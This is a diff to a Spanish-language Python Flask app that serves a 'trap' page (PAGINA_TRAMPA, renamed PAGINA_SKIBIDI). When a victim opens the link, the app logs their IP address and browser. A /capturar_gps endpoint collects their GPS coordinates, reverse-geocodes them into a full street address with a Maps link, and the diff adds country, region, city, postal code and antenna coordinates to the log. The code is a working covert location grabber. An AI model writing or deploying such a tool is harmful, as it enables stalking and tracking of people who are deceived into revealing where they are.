@@ -4,7 +4,7 @@ import geocoder
 
 app = Flask(__name__)
 
-PAGINA_TRAMPA = """
+PAGINA_SKIBIDI = """
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -56,11 +56,11 @@ def inicio():
     ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent')
     
-    print("\n--- [!]Linkabierto---")
+    print("\n--- [!]Linkabierto ---")
     print(f"Dirección IP: {ip_cliente}")
     print(f"Dispositivo/Navegador: {user_agent}")
     print("-----------------------------------\n")
-    return render_template_string(PAGINA_TRAMPA)
+    return render_template_string(PAGINA_SKIBIDI)
 
 @app.route('/capturar_gps')
 def capturar_gps():
@@ -86,6 +86,9 @@ def capturar_gps():
     except Exception as e:
         direccion_completa = f"Error al traducir: {e}"
 
+
+    print("////////////////////////////////////////////////")
+    print("----------------------------------------------\n")
     print("\n--- [🔥] UBICACIÓN ---")
     print(f"Latitud: {lat}")
     print(f"Longitud: {lon}")
@@ -96,6 +99,14 @@ def capturar_gps():
     print(f"Dirección Completa: {direccion_completa}") 
     print(f"Ver en Google Maps: https://google.com{lat},{lon}")
     print("-----------------------------------------\n")
+    print("--Data--")
+    print(f"País: {g.country}")
+    print(f"Estado/Región: {g.state}")
+    print(f"Ciudad General: {g.city}")
+    print(f"Código Postal de la Central: {g.postal}")
+    print(f"Coordenadas de la Antena (Lat, Lon): {g.latlng}")
+    print("----------------------------------------------\n")
+    print("////////////////////////////////////////////////")
     return "OK", 200
 
 
